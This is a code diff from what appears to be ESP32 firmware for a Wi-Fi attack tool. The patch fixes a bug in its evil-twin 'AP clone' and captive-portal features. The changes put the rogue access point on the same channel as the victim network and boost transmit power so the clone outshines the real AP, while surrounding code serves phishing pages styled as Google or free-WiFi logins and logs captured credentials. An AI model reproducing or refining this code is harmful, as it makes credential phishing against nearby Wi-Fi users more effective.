@@ -192,6 +192,13 @@ static volatile uint32_t s_creds = 0;
 static volatile uint32_t s_hits  = 0;
 static const char *s_current_html = HTML_GOOGLE;
 static char s_portal_ssid[33] = "Free WiFi";
+/* Bug 11: AP Clone quietly hardcoded ch1, so a victim AP on ch6/11
+ * showed a "weak" clone signal (clients on the victim's actual channel
+ * couldn't see us at all; only clients scanning across channels picked
+ * us up at intermittent strength). Apclone + quick-clone now set this
+ * to g_last_selected_ap.channel before run_portal. Default 1 keeps
+ * template-portal entries (user types SSID, no scan source) on ch1. */
+static uint8_t  s_portal_channel = 1;
 
 /* Set by log_cred() when a new credential lands. Picked up by the main
  * loop a moment later so the HTTP response isn't stalled behind the
@@ -473,13 +480,17 @@ static void run_portal(void)
     wifi_config_t apc = {};
     strncpy((char *)apc.ap.ssid, s_portal_ssid, sizeof(apc.ap.ssid) - 1);
     apc.ap.ssid_len        = strlen(s_portal_ssid);
-    apc.ap.channel         = 1;
+    /* Bug 11: use the channel set by apclone / quick-clone (defaults to
+     * 1 for template-portal entries). Clamp 1-13 in case scan reported
+     * something weird. */
+    apc.ap.channel         = (s_portal_channel >= 1 && s_portal_channel <= 13)
+                             ? s_portal_channel : 1;
     apc.ap.authmode        = WIFI_AUTH_OPEN;
     apc.ap.max_connection  = 4;
     apc.ap.beacon_interval = 100;
     apc.ap.ssid_hidden     = 0;
     rc = esp_wifi_set_config(WIFI_IF_AP, &apc);
-    Serial.printf("[portal] set_config rc=%d\n", (int)rc);
+    Serial.printf("[portal] set_config rc=%d ch=%u\n", (int)rc, (unsigned)apc.ap.channel);
     rc = esp_wifi_start();
     Serial.printf("[portal] wifi_start rc=%d\n", (int)rc);
     if (rc != ESP_OK) {
@@ -487,9 +498,16 @@ static void run_portal(void)
         esp_wifi_deinit();
         return;
     }
+    /* Bug 11: bump TX power to 19.5 dBm (~89 mW). Default after fresh
+     * init can sit around 15 dBm (~31 mW) which is half the perceived
+     * RSSI of the victim. esp_wifi_set_max_tx_power takes 0.25 dBm
+     * units (78 = 19.5 dBm). Must be called AFTER esp_wifi_start.
+     * Matches Bruce's beacon_spam pattern. */
+    esp_wifi_set_max_tx_power(78);
     /* Force the channel post-start. Some builds ignore the channel in
-     * the config struct and default to 0 (silent no-beacon). */
-    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+     * the config struct and default to 0 (silent no-beacon). Use the
+     * same s_portal_channel-derived value as the config. */
+    esp_wifi_set_channel(apc.ap.channel, WIFI_SECOND_CHAN_NONE);
     /* Settle. AP needs the AP_START event to fully process before it
      * starts beaconing. 1.5 s matches Bruce's 3 s upper bound halved. */
     uint32_t t_settle = millis();
@@ -631,10 +649,16 @@ void feat_wifi_portal(void)
         if (wifi_auth_has_pmf(g_last_selected_ap.auth) && !wifi_pmf_warning()) return;
         strncpy(s_portal_ssid, g_last_selected_ap.ssid, sizeof(s_portal_ssid) - 1);
         s_portal_ssid[sizeof(s_portal_ssid) - 1] = '\0';
+        /* Bug 11: match victim's channel — see feat_wifi_apclone. */
+        s_portal_channel = g_last_selected_ap.channel;
         s_current_html = HTML_FREEWIFI;
         run_portal();
         return;
     }
+
+    /* Reset channel for non-clone flows — template / preset / custom
+     * portal entries broadcast on ch1 (no victim to match). */
+    s_portal_channel = 1;
 
     /* Step 2 — pick where the broadcast SSID comes from. The template
      * picked above selects the LOOK of the portal; this picks the NAME
@@ -666,6 +690,9 @@ void feat_wifi_portal(void)
             }
             strncpy(s_portal_ssid, g_last_selected_ap.ssid, sizeof(s_portal_ssid) - 1);
             s_portal_ssid[sizeof(s_portal_ssid) - 1] = '\0';
+            /* Bug 11: match the victim's channel for the clone variant
+             * too — same reasoning as feat_wifi_apclone. */
+            s_portal_channel = g_last_selected_ap.channel;
             break;
 
         case SSID_SRC_CUSTOM: {
@@ -697,6 +724,11 @@ void feat_wifi_apclone(void)
     if (wifi_auth_has_pmf(g_last_selected_ap.auth) && !wifi_pmf_warning()) return;
     strncpy(s_portal_ssid, g_last_selected_ap.ssid, sizeof(s_portal_ssid) - 1);
     s_portal_ssid[sizeof(s_portal_ssid) - 1] = '\0';
+    /* Bug 11: match the victim's channel so clients tracking that
+     * SSID on ch6/11 actually see our clone. ch1 hardcode used to
+     * leave the clone on a different channel from the target — that
+     * was the "weak signal" the user reported. */
+    s_portal_channel = g_last_selected_ap.channel;
     s_current_html = HTML_FREEWIFI;
     run_portal();
 }
